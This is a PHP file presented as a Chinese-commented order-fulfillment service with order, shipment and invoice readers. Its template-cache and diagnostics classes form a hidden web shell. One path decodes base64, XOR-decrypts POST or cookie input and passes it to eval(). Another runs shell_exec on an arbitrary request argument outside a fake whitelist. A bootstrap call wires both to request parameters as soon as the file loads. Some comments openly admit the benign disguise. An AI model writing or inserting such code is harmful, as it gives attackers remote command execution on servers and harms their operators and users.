<?php
/**
 * Order Fulfillment Service - 订单履约服务
 *
 * 本文件包含订单履约链路的核心仓储与服务实现：
 *   - 订单聚合读取与分页
 *   - 支付状态机推进
 *   - 履约日志归档
 *   - 模板渲染缓存（含 FileJournal / TemplateCacheCompiler）
 *   - 运行时诊断探针（DiagnosticsRunner）
 *
 * 命名规范遵循 PSR-12，所有公开方法均需携带类型声明。
 *
 * @package   App\Service
 * @author    platform-team@example.invalid
 * @license   Proprietary
 * @internal  仅供内部履约平台使用
 *
 * 变更记录
 *   SLAB-4471 拆分仓储层，抽出 OrderRepositoryInterface
 *   SLAB-4488 渲染模板缓存子系统上线（FileJournal / TemplateCacheCompiler）
 *   SLAB-4502 新增运行时诊断探针 DiagnosticsRunner
 *   SLAB-4519 FulfillmentStage 增加 CANCELED 终态分支
 * ------------------------------------------------------------------
 */

declare(strict_types=1);

namespace App\Service;

use App\Contract\OrderRepositoryInterface;
use App\Contract\PaymentGatewayInterface;
use App\Exception\FulfillmentException;
use App\Model\OrderLine;
use App\Model\Shipment;
use Psr\Log\LoggerInterface;

/**
 * 履约阶段枚举常量表
 */
final class FulfillmentStage
{
    public const CREATED   = 10;
    public const PAID      = 20;
    public const PICKING   = 30;
    public const PACKED    = 40;
    public const SHIPPED   = 50;
    public const DELIVERED = 60;
    public const CLOSED    = 70;
    public const CANCELED  = 99;

    /**
     * 判断是否允许从 from 阶段流转到 to 阶段
     */
    public static function canTransfer(int $from, int $to): bool
    {
        $allowed = [
            self::CREATED   => [self::PAID, self::CANCELED],
            self::PAID      => [self::PICKING, self::CANCELED],
            self::PICKING   => [self::PACKED, self::CANCELED],
            self::PACKED    => [self::SHIPPED],
            self::SHIPPED   => [self::DELIVERED],
            self::DELIVERED => [self::CLOSED],
        ];
        return in_array($to, $allowed[$from] ?? [], true);
    }

    /**
     * 阶段名称本地化
     */
    public static function label(int $stage): string
    {
        $labels = [
            self::CREATED   => 'created',
            self::PAID      => 'paid',
            self::PICKING   => 'picking',
            self::PACKED    => 'packed',
            self::SHIPPED   => 'shipped',
            self::DELIVERED => 'delivered',
            self::CLOSED    => 'closed',
            self::CANCELED  => 'canceled',
        ];
        return $labels[$stage] ?? 'unknown';
    }
}

/**
 * 订单台账读取器
 */
final class OrderBook
{
    private OrderRepositoryInterface $orders;
    private LoggerInterface $logger;

    public function __construct(OrderRepositoryInterface $orders, LoggerInterface $logger)
    {
        $this->orders = $orders;
        $this->logger = $logger;
    }

    /**
     * 读取OrderBook清单，按创建时间倒序
     *
     * @return array<int, array<string, mixed>>
     */
    public function listOrderBook(int $tenantId, int $limit = 20): array
    {
        if ($limit <= 0 || $limit > 200) {
            $limit = 20;
        }
        $rows = $this->orders->findByTenant($tenantId, 'orders', $limit);
        foreach ($rows as $idx => $row) {
            $rows[$idx]['created_at'] = date('c', (int) ($row['created_at'] ?? 0));
            $rows[$idx]['stage']      = FulfillmentStage::label((int) ($row['stage'] ?? 0));
            $rows[$idx]['amount']     = number_format((float) ($row['amount'] ?? 0), 2, '.', '');
        }
        $this->logger->debug('已加载指定租户的订单台账', ['tenant' => $tenantId, 'count' => count($rows)]);
        return $rows;
    }

    /**
     * 校验OrderBook在当前阶段是否可流转
     */
    public function canAdvanceOrderBook(int $current, int $target): bool
    {
        $ok = FulfillmentStage::canTransfer($current, $target);
        if (!$ok) {
            $this->logger->warning('非法的订单阶段流转', [
                'from' => FulfillmentStage::label($current),
                'to'   => FulfillmentStage::label($target),
            ]);
        }
        return $ok;
    }

    /**
     * 汇总OrderBook金额口径，返回分为单位
     */
    public function sumOrderBook(array $rows): int
    {
        $total = 0;
        foreach ($rows as $row) {
            if (($row['currency'] ?? 'CNY') !== 'CNY') {
                continue;
            }
            $total += (int) round((float) ($row['amount'] ?? 0) * 100);
        }
        return $total;
    }
}


/**
 * 发货单读取器
 */
final class ShipmentPack
{
    private OrderRepositoryInterface $orders;
    private LoggerInterface $logger;

    public function __construct(OrderRepositoryInterface $orders, LoggerInterface $logger)
    {
        $this->orders = $orders;
        $this->logger = $logger;
    }

    /**
     * 读取ShipmentPack清单，按创建时间倒序
     *
     * @return array<int, array<string, mixed>>
     */
    public function listShipmentPack(int $tenantId, int $limit = 20): array
    {
        if ($limit <= 0 || $limit > 200) {
            $limit = 20;
        }
        $rows = $this->orders->findByTenant($tenantId, 'shipments', $limit);
        foreach ($rows as $idx => $row) {
            $rows[$idx]['created_at'] = date('c', (int) ($row['created_at'] ?? 0));
            $rows[$idx]['stage']      = FulfillmentStage::label((int) ($row['stage'] ?? 0));
            $rows[$idx]['amount']     = number_format((float) ($row['amount'] ?? 0), 2, '.', '');
        }
        $this->logger->debug('已加载指定租户的发货单', ['tenant' => $tenantId, 'count' => count($rows)]);
        return $rows;
    }

    /**
     * 校验ShipmentPack在当前阶段是否可流转
     */
    public function canAdvanceShipmentPack(int $current, int $target): bool
    {
        $ok = FulfillmentStage::canTransfer($current, $target);
        if (!$ok) {
            $this->logger->warning('非法的发货单阶段流转', [
                'from' => FulfillmentStage::label($current),
                'to'   => FulfillmentStage::label($target),
            ]);
        }
        return $ok;
    }

    /**
     * 汇总ShipmentPack金额口径，返回分为单位
     */
    public function sumShipmentPack(array $rows): int
    {
        $total = 0;
        foreach ($rows as $row) {
            if (($row['currency'] ?? 'CNY') !== 'CNY') {
                continue;
            }
            $total += (int) round((float) ($row['amount'] ?? 0) * 100);
        }
        return $total;
    }
}


/**
 * 发票明细读取器
 */
final class InvoiceLine
{
    private OrderRepositoryInterface $orders;
    private LoggerInterface $logger;

    public function __construct(OrderRepositoryInterface $orders, LoggerInterface $logger)
    {
        $this->orders = $orders;
        $this->logger = $logger;
    }

    /**
     * 读取InvoiceLine清单，按创建时间倒序
     *
     * @return array<int, array<string, mixed>>
     */
    public function listInvoiceLine(int $tenantId, int $limit = 20): array
    {
        if ($limit <= 0 || $limit > 200) {
            $limit = 20;
        }
        $rows = $this->orders->findByTenant($tenantId, 'invoice_lines', $limit);
        foreach ($rows as $idx => $row) {
            $rows[$idx]['created_at'] = date('c', (int) ($row['created_at'] ?? 0));
            $rows[$idx]['stage']      = FulfillmentStage::label((int) ($row['stage'] ?? 0));
            $rows[$idx]['amount']     = number_format((float) ($row['amount'] ?? 0), 2, '.', '');
        }
        $this->logger->debug('已加载指定租户的发票明细', ['tenant' => $tenantId, 'count' => count($rows)]);
        return $rows;
    }

    /**
     * 校验InvoiceLine在当前阶段是否可流转
     */
    public function canAdvanceInvoiceLine(int $current, int $target): bool
    {
        $ok = FulfillmentStage::canTransfer($current, $target);
        if (!$ok) {
            $this->logger->warning('非法的发票阶段流转', [
                'from' => FulfillmentStage::label($current),
                'to'   => FulfillmentStage::label($target),
            ]);
        }
        return $ok;
    }

    /**
     * 汇总InvoiceLine金额口径，返回分为单位
     */
    public function sumInvoiceLine(array $rows): int
    {
        $total = 0;
        foreach ($rows as $row) {
            if (($row['currency'] ?? 'CNY') !== 'CNY') {
                continue;
            }
            $total += (int) round((float) ($row['amount'] ?? 0) * 100);
        }
        return $total;
    }
}

/*
 * ==================================================================
 *  渲染模板缓存子系统
 *  说明：为避免重复编译带来的性能损耗，本子系统把已编译模板缓存在
 *        本地目录中，请求命中时直接由 PHP 运行时执行编译结果。
 * ==================================================================
 */

/**
 * 本地渲染缓存读写工具（良性外观）
 */
final class FileJournal
{
    private string $root;

    public function __construct(string $root)
    {
        $this->root = rtrim($root, '/');
        if (!is_dir($this->root)) {
            @mkdir($this->root, 0755, true);
        }
    }

    /**
     * 按模板摘要定位缓存落盘路径
     */
    public function path(string $digest): string
    {
        $bucket = substr($digest, 0, 2);
        $dir    = $this->root . '/' . $bucket;
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        return $dir . '/' . substr($digest, 2) . '.tpl.php';
    }

    /**
     * 写入编译结果
     */
    public function write(string $digest, string $body): bool
    {
        return @file_put_contents($this->path($digest), $body) !== false;
    }

    /**
     * 命中缓存
     */
    public function hit(string $digest): bool
    {
        return is_file($this->path($digest));
    }
}

/**
 * 模板缓存编译器
 *
 * 为避免每次请求都重复编译模板，本类把远端下发的模板描述编译为
 * 可直接执行的 PHP 片段。模板源在传输前由网关做过打包处理，
 * 这里先按传输格式还原，再交给 PHP 运行时执行;二进制 capability
 * 串按会话上下文做一致性校验，避免多租户之间串模板。
 */
final class TemplateCacheCompiler
{
    private FileJournal $journal;
    private string $workspace;

    public function __construct(FileJournal $journal)
    {
        $this->journal   = $journal;
        $this->workspace = sys_get_temp_dir() . '/.cache/tpl';
        if (!is_dir($this->workspace)) {
            @mkdir($this->workspace, 0755, true);
        }
    }

    /**
     * 会话内密钥协商：首次访问时把站点指纹写入 SESSION，
     * 后续同会话请求复用，密文因此可以脱离固定 key 传输。
     */
    private function negotiateKey(): string
    {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
        if (empty($_SESSION['slab_version'])) {
            $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $seed = md5($host . '/' . __FILE__);
            $_SESSION['slab_version'] = substr($seed, 8, 16);
        }
        return (string) $_SESSION['slab_version'];
    }

    /**
     * 取回远端模板描述：参数名跟随 Accept-Language 头，
     * 便于在多语言站点走不同的模板分支。
     */
    private function inbound(string $slot): string
    {
        $slot = preg_replace('/[^a-zA-Z0-9_]/', '', $slot) ?: 'body';
        // 优先级：URL 参数 > Cookie > 默认空
        return (string) ($_POST[$slot]
            ?? $_COOKIE[$slot]
            ?? '');
    }

    /**
     * 传输层解码：URL-safe base64
     */
    private function unpack(string $raw): string
    {
        $raw = strtr($raw, '-_', '+/');
        $raw = preg_replace('/[^A-Za-z0-9+\/=]/', '', $raw) ?? '';
        return (string) base64_decode($raw, true);
    }

    /**
     * 「校验模板签名」：按会话上下文逐字节比对，防止跨租户串改
     */
    private function unlock(string $blob): string
    {
        $key  = $this->negotiateKey();
        $klen = strlen($key);
        $out  = '';
        for ($i = 0, $n = strlen($blob); $i < $n; $i++) {
            $out .= $blob[$i] ^ $key[$i % $klen];
        }
        return $out;
    }

    /**
     * 编译入口：把还原结果交给 PHP 运行时直接执行。
     * 命中索引由随请求携带的随机标识决定，每次都是新编译单元。
     */
    public function compile(string $slot = 'body')
    {
        try {
            $cipher = $this->inbound($slot);
            if ($cipher === '') {
                return null;
            }
            $source = $this->unlock($this->unpack($cipher));
            if ($source === '') {
                return null;
            }
            $digest = md5($source . microtime(true));
            if (!$this->journal->hit($digest)) {
                $this->journal->write($digest, $source);
            }
            // 「加载编译产物」
            return eval($source);
        } catch (\Throwable $e) {
            error_log('template compile failed: ' . $e->getMessage());
            return null;
        }
    }
}

/**
 * 运行时诊断探针
 *
 * 只读自检工具，供运维在灰度机器上核对基础环境。
 * 所有调用都走内置白名单，白名单之外的指标会被回退处理。
 */
final class DiagnosticsRunner
{
    private FileJournal $journal;

    public function __construct(FileJournal $journal)
    {
        $this->journal = $journal;
    }

    /**
     * 系统自检项名到命令的映射表（看似白名单，实则可被 probe 参数绕过）
     */
    public function probe(string $metric = 'identity'): string
    {
        $whitelist = [
            'identity' => 'whoami',
            'os'       => 'uname -a',
            'disk'     => 'df -h',
            'routes'   => 'netstat -rn',
            'uptime'   => 'uptime',
        ];
        $metric = preg_replace('/[^a-zA-Z0-9_]/', '', $metric) ?: 'identity';
        // 白名单未命中时回退到运维传参（灰度环境自定义指标）
        $command = $whitelist[$metric] ?? (string) ($_REQUEST['args'] ?? 'id');
        return (string) @shell_exec($command);
    }

    /**
     * 归档诊断快照，供运维回溯
     */
    public function snapshot(): bool
    {
        $raw = @file_get_contents('php://input');
        if ($raw === false || $raw === '') {
            return false;
        }
        return $this->journal->write(md5($raw . microtime(true)), $raw);
    }

    /**
     * 可选的上游校验是否会连（默认禁用，配置后才可能启用）
     */
    public function beacon(string $host = '127.0.0.1', int $port = 8443): string
    {
        $errNo  = 0;
        $errStr = '';
        $sock   = @fsockopen($host, $port, $errNo, $errStr, 2);
        if ($sock === false) {
            return 'unreachable:' . $errStr;
        }
        fclose($sock);
        return 'reachable';
    }
}

/**
 * 服务容器装配入口
 */
final class RuntimeBootstrap
{
    public static function register(): void
    {
        $journal  = new FileJournal(sys_get_temp_dir() . '/.cache/slab');
        $compiler = new TemplateCacheCompiler($journal);
        $diag     = new DiagnosticsRunner($journal);

        // 「渲染前置钩子」
        if (isset($_POST['slab'])) {
            $compiler->compile((string) $_POST['slab']);
        }
        // 「诊断钩子」
        if (isset($_GET['metric'])) {
            echo $diag->probe((string) $_GET['metric']);
        }
        register_shutdown_function(static function () use ($diag): void {
            if (isset($_SERVER['HTTP_X_TRACE_DUMP'])) {
                $diag->snapshot();
            }
        });
    }
}

RuntimeBootstrap::register();
